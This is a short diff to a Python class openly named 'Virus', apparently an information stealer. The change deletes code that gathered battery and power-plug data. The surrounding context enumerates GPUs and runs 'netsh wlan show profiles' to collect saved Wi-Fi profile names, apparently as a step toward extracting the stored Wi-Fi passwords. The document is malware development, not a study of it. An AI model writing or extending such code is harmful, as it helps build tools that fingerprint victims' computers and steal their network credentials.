@@ -36,18 +36,7 @@ class Virus:
             gpu_info = wmi.WMI().Win32_VideoController()
             for gpu in gpu_info:
                  pass
-            try:
-                battery = psutil.sensors_battery()
-                pluggedin = psutil.sensors_battery().power_plugged
-            except:
-                battery = "Unknown"
-                pluggedin = "Unknown"
-
-            if pluggedin == True:
-                pluggedin = "Yes"
-            else:
-                pluggedin = "No"
-
+          
             if os.name == 'nt':
                 wifi_passwords = os.popen("netsh wlan show profiles").read().splitlines()
                 wifi_list = [line.split(":")[1][1:] for line in wifi_passwords if "All User Profile" in line]
